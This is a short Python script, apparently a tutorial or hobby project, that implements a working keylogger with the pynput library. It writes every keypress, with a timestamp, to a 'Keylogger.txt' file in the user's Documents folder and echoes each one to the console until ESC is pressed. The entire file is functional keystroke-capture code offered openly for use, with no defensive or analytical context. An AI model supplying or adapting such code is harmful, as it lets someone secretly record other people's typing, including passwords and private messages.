# Install the pynput, os and datetime module using pip
from pynput import keyboard
import os, datetime

# navigating the path to the documents
os.chdir("C:\\Users\\" + str(os.environ.get('USERNAME')) + "\\Documents")
# opening a text file named Keylogger, if not it will create a new one. also this is in append mode. the data will be appended in the previous one.
f = open("Keylogger.txt", "a+")


# function to get the key pressed
def on_press(key):
    try:
        print(str(datetime.datetime.now()) + ' :- alphanumeric key {0} pressed'.format(key.char))
        f.write(str(datetime.datetime.now()) + ' :- alphanumeric key {0} pressed \n'.format(key.char))
    except AttributeError:
        print(str(datetime.datetime.now()) + ' :- special key {0} pressed'.format(key))
        f.write(str(datetime.datetime.now()) + ' :- special key {0} pressed'.format(key))


# function to quit the key logger process. when ESC key is pressed the logger will be stopped
def on_release(key):
    if key == keyboard.Key.esc:
        f.close()
        return False


# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
